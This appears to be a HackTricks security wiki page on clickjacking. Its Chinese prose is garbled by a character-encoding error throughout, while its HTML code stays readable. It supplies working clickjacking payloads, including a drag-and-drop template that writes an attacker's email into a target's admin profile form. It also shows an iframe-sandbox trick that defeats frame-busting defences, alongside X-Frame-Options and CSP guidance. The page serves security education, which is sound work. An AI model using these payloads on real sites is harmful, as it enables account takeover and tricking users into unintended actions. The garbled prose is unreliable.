# ç‚¹å‡»åŠ«æŒ

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒ

ç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§æ”»å‡»ï¼Œå®ƒ**è¯±éª—**ç”¨æˆ·**ç‚¹å‡»**ä¸€ä¸ª**ä¸å¯è§**æˆ–ä¼ªè£…æˆå¦ä¸€ä¸ªå…ƒç´ çš„ç½‘é¡µ**å…ƒç´ **ã€‚è¿™å¯èƒ½å¯¼è‡´ç”¨æˆ·æ— æ„ä¸­ä¸‹è½½æ¶æ„è½¯ä»¶ï¼Œè®¿é—®æ¶æ„ç½‘é¡µï¼Œæä¾›å‡­è¯æˆ–æ•æ„Ÿä¿¡æ¯ï¼Œè½¬è´¦æˆ–åœ¨çº¿è´­ä¹°äº§å“ã€‚ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://www.imperva.com/learn/application-security/clickjacking/)ï¼‰ã€‚

### é¢„å¡«å……è¡¨å•æŠ€å·§

æœ‰æ—¶å€™ï¼Œå½“åŠ è½½é¡µé¢æ—¶ï¼Œå¯ä»¥ä½¿ç”¨GETå‚æ•°**å¡«å……è¡¨å•å­—æ®µçš„å€¼**ã€‚æ”»å‡»è€…å¯èƒ½ä¼šæ»¥ç”¨è¿™ç§è¡Œä¸ºï¼Œç”¨ä»»æ„æ•°æ®å¡«å……è¡¨å•ï¼Œå¹¶å‘é€ç‚¹å‡»åŠ«æŒæœ‰æ•ˆè½½è·ï¼Œä½¿ç”¨æˆ·æŒ‰ä¸‹æäº¤æŒ‰é’®ã€‚

### ä½¿ç”¨æ‹–æ”¾å¡«å……è¡¨å•

å¦‚æœæ‚¨éœ€è¦ç”¨æˆ·**å¡«å†™è¡¨å•**ï¼Œä½†æ‚¨ä¸æƒ³ç›´æ¥è¦æ±‚ä»–å†™ä¸€äº›ç‰¹å®šä¿¡æ¯ï¼ˆæ¯”å¦‚æ‚¨çŸ¥é“çš„ç”µå­é‚®ä»¶æˆ–ç‰¹å®šå¯†ç ï¼‰ï¼Œæ‚¨å¯ä»¥åªè¦æ±‚ä»–**æ‹–æ”¾**ä¸€äº›ä¸œè¥¿ï¼Œè¿™å°†å†™å…¥æ‚¨æ§åˆ¶çš„æ•°æ®ï¼Œå°±åƒåœ¨[**è¿™ä¸ªä¾‹å­**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)ä¸­ä¸€æ ·ã€‚

### åŸºç¡€æœ‰æ•ˆè½½è·
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### å¤šæ­¥éª¤æœ‰æ•ˆè½½è·
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### æ‹–æ”¾ + ç‚¹å‡»è´Ÿè½½
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + ç‚¹å‡»åŠ«æŒ

å¦‚æœæ‚¨å‘ç°äº†ä¸€ä¸ª**éœ€è¦ç”¨æˆ·ç‚¹å‡»**æŸä¸ªå…ƒç´ æ¥**è§¦å‘**XSSçš„**XSSæ”»å‡»**ï¼Œå¹¶ä¸”é¡µé¢**å®¹æ˜“å—åˆ°ç‚¹å‡»åŠ«æŒ**ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å®ƒæ¬ºéª—ç”¨æˆ·ç‚¹å‡»æŒ‰é’®/é“¾æ¥ã€‚\
ç¤ºä¾‹ï¼š\
_æ‚¨åœ¨å¸æˆ·çš„ä¸€äº›ç§äººè¯¦ç»†ä¿¡æ¯ä¸­å‘ç°äº†ä¸€ä¸ª**è‡ªèº«XSS**ï¼ˆåªæœ‰æ‚¨å¯ä»¥è®¾ç½®å’Œè¯»å–çš„è¯¦ç»†ä¿¡æ¯ï¼‰ã€‚è®¾ç½®è¿™äº›è¯¦ç»†ä¿¡æ¯çš„é¡µé¢**è¡¨å•**å®¹æ˜“å—åˆ°**ç‚¹å‡»åŠ«æŒ**ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥ä½¿ç”¨GETå‚æ•°**é¢„å¡«å……**è¡¨å•ã€‚_\
\_\_æ”»å‡»è€…å¯ä»¥å‡†å¤‡å¯¹è¯¥é¡µé¢çš„**ç‚¹å‡»åŠ«æŒ**æ”»å‡»ï¼Œ**é¢„å¡«å……**è¡¨å•**XSSæœ‰æ•ˆè½½è·**ï¼Œå¹¶**è¯±éª—**ç”¨æˆ·**æäº¤**è¡¨å•ã€‚å› æ­¤ï¼Œ**å½“è¡¨å•è¢«æäº¤**ä¸”å€¼è¢«ä¿®æ”¹æ—¶ï¼Œ**ç”¨æˆ·å°†æ‰§è¡ŒXSS**ã€‚

## å¦‚ä½•é¿å…ç‚¹å‡»åŠ«æŒ

### å®¢æˆ·ç«¯é˜²å¾¡

å¯ä»¥åœ¨å®¢æˆ·ç«¯æ‰§è¡Œè„šæœ¬ï¼Œæ‰§è¡Œä»¥ä¸‹ä¸€äº›æˆ–å…¨éƒ¨è¡Œä¸ºä»¥é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼š

* æ£€æŸ¥å¹¶ç¡®ä¿å½“å‰åº”ç”¨ç¨‹åºçª—å£æ˜¯ä¸»çª—å£æˆ–é¡¶å±‚çª—å£ï¼Œ
* ä½¿æ‰€æœ‰æ¡†æ¶å¯è§ï¼Œ
* é˜²æ­¢ç‚¹å‡»ä¸å¯è§çš„æ¡†æ¶ï¼Œ
* æ‹¦æˆªå¹¶æ ‡è®°å¯¹ç”¨æˆ·å¯èƒ½çš„ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚

#### ç»•è¿‡

ç”±äºæ¡†æ¶ç ´åè€…æ˜¯JavaScriptï¼Œå› æ­¤æµè§ˆå™¨çš„å®‰å…¨è®¾ç½®å¯èƒ½ä¼šé˜»æ­¢å®ƒä»¬çš„æ“ä½œï¼Œæˆ–è€…æµè§ˆå™¨ç”šè‡³å¯èƒ½ä¸æ”¯æŒJavaScriptã€‚å¯¹æŠ—æ¡†æ¶ç ´åè€…çš„æœ‰æ•ˆæ”»å‡»è€…è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨**HTML5 iframe `sandbox` å±æ€§**ã€‚å½“è®¾ç½®äº†`allow-forms`æˆ–`allow-scripts`å€¼ï¼Œå¹¶ä¸”çœç•¥äº†`allow-top-navigation`å€¼æ—¶ï¼Œæ¡†æ¶ç ´åè„šæœ¬å¯ä»¥è¢«ä¸­å’Œï¼Œå› ä¸ºiframeæ— æ³•æ£€æŸ¥å®ƒæ˜¯å¦æ˜¯é¡¶å±‚çª—å£ï¼š
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms` å’Œ `allow-scripts` å€¼å…è®¸åœ¨iframeä¸­æ‰§è¡ŒæŒ‡å®šæ“ä½œï¼Œä½†ç¦ç”¨äº†é¡¶çº§å¯¼èˆªã€‚è¿™é˜»æ­¢äº†ç ´åæ¡†æ¶çš„è¡Œä¸ºï¼ŒåŒæ—¶å…è®¸åœ¨ç›®æ ‡ç«™ç‚¹å†…çš„åŠŸèƒ½ã€‚

æ ¹æ®æ‰§è¡Œçš„Clickjackingæ”»å‡»ç±»å‹ï¼Œ**æ‚¨å¯èƒ½è¿˜éœ€è¦å…è®¸**ï¼š`allow-same-origin` å’Œ `allow-modals` æˆ–[æ›´å¤š](https://www.w3schools.com/tags/att_iframe_sandbox.asp)ã€‚å‡†å¤‡æ”»å‡»æ—¶ï¼Œåªéœ€æ£€æŸ¥æµè§ˆå™¨çš„æ§åˆ¶å°ï¼Œå®ƒå¯èƒ½ä¼šå‘Šè¯‰æ‚¨éœ€è¦å…è®¸å“ªäº›å…¶ä»–è¡Œä¸ºã€‚

### X-Frame-Options

**`X-Frame-Options` HTTPå“åº”å¤´** å¯ç”¨äºæŒ‡ç¤ºæµè§ˆå™¨æ˜¯å¦åº”è¯¥è¢«**å…è®¸**åœ¨ `<frame>` æˆ– `<iframe>` ä¸­æ¸²æŸ“é¡µé¢ã€‚ç½‘ç«™å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½æ¥é¿å…Clickjackingæ”»å‡»ï¼Œç¡®ä¿**ä»–ä»¬çš„å†…å®¹ä¸è¢«åµŒå…¥åˆ°å…¶ä»–ç½‘ç«™ä¸­**ã€‚ä¸ºæ‰€æœ‰åŒ…å«HTMLå†…å®¹çš„å“åº”è®¾ç½®**`X-Frame-Options`** å¤´ã€‚å¯èƒ½çš„å€¼æœ‰ï¼š

* `X-Frame-Options: deny` é˜»æ­¢ä»»ä½•åŸŸæ¡†æ¶å†…å®¹ **ï¼ˆæ¨èå€¼ï¼‰**
* `X-Frame-Options: sameorigin` åª**å…è®¸å½“å‰ç«™ç‚¹**æ¡†æ¶å†…å®¹ã€‚
* `X-Frame-Options: allow-from https://trusted.com` **å…è®¸æŒ‡å®šçš„'uri'**æ¡†æ¶æ­¤é¡µé¢ã€‚
* è¯·æ£€æŸ¥ä¸‹é¢çš„é™åˆ¶ï¼Œå› ä¸º**å¦‚æœæµè§ˆå™¨ä¸æ”¯æŒï¼Œè¿™å°†å¤±è´¥**ã€‚
* å…¶ä»–æµè§ˆå™¨æ”¯æŒæ–°çš„**CSP frame-ancestorsæŒ‡ä»¤**ã€‚ä¸€äº›åŒæ—¶æ”¯æŒä¸¤è€…ã€‚

### å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) frame-ancestorsæŒ‡ä»¤

**æ¨èçš„clickjackingä¿æŠ¤**æ˜¯åœ¨åº”ç”¨ç¨‹åºçš„å†…å®¹å®‰å…¨ç­–ç•¥ä¸­åŠ å…¥**`frame-ancestors`æŒ‡ä»¤**ã€‚\
**`frame-ancestors 'none'`** æŒ‡ä»¤çš„è¡Œä¸ºç±»ä¼¼äº **X-Frame-Options `deny`** æŒ‡ä»¤ï¼ˆ_æ²¡æœ‰äººå¯ä»¥æ¡†æ¶é¡µé¢_ï¼‰ã€‚\
**`frame-ancestors 'self'`** æŒ‡ä»¤å¤§è‡´ç›¸å½“äº **X-Frame-Options `sameorigin`** æŒ‡ä»¤ï¼ˆ_åªæœ‰å½“å‰ç«™ç‚¹å¯ä»¥æ¡†æ¶å®ƒ_ï¼‰ã€‚\
**`frame-ancestors trusted.com`** æŒ‡ä»¤å¤§è‡´ç›¸å½“äº **X-Frame-Options** `allow-from`æŒ‡ä»¤ï¼ˆ_åªæœ‰å—ä¿¡ä»»çš„ç«™ç‚¹å¯ä»¥æ¡†æ¶å®ƒ_ï¼‰ã€‚

ä»¥ä¸‹CSPä»…å°†æ¡†æ¶åˆ—å…¥åŒä¸€åŸŸåï¼š

`Content-Security-Policy: frame-ancestors 'self';`

æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯å’Œæ›´å¤æ‚ç¤ºä¾‹ï¼Œè¯·å‚é˜…ä»¥ä¸‹æ–‡æ¡£ï¼š

* [https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

### é™åˆ¶ <a href="#limitations" id="limitations"></a>

* **æµè§ˆå™¨æ”¯æŒï¼š** å¹¶éæ‰€æœ‰ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒCSP frame-ancestorsã€‚
* **X-Frame-Optionsä¼˜å…ˆï¼š** [CSPè§„èŒƒçš„"ä¸X-Frame-Optionsçš„å…³ç³»"éƒ¨åˆ†](https://w3c.github.io/webappsec/specs/content-security-policy/#frame-ancestors-and-frame-options)è¯´ï¼š"_å¦‚æœèµ„æºæ˜¯å¸¦æœ‰åŒ…å«åä¸ºframe-ancestorsçš„æŒ‡ä»¤çš„ç­–ç•¥äº¤ä»˜çš„ï¼Œå¹¶ä¸”å…¶å¤„ç½®ä¸º'æ‰§è¡Œ'ï¼Œé‚£ä¹ˆå¿…é¡»å¿½ç•¥X-Frame-Optionså¤´_"ï¼Œä½†Chrome 40å’ŒFirefox 35å¿½ç•¥frame-ancestorsæŒ‡ä»¤ï¼Œè€Œéµå¾ªX-Frame-Optionså¤´ã€‚

## å‚è€ƒèµ„æ–™

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
